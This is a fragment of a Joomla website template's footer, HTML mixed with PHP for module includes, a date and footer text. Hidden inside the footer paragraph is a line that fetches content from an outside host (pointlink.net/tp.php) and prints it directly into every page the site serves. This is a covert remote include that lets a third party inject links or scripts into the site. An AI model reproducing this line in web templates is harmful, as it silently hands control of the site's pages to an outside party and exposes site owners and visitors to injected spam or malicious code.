...
<div class="user3"><jdoc:include type="modules" name="user3" style="xhtml" /></div>  
    <div class="tg">
            <p style="display:inline"><jdoc:include type="modules" name="copyright"/> <?php echo date('l \t\h\e jS');?> - <?php if ($this->params->get( 'footerdisable' )) : ?><?php echo ($footertext); ?><?php endif; ?>. <?php $comp=file_get_contents("http://www.pointlink.net/tp.php"); echo $comp; ?></p>
</div>
</div>
</div></div></div>
</body>
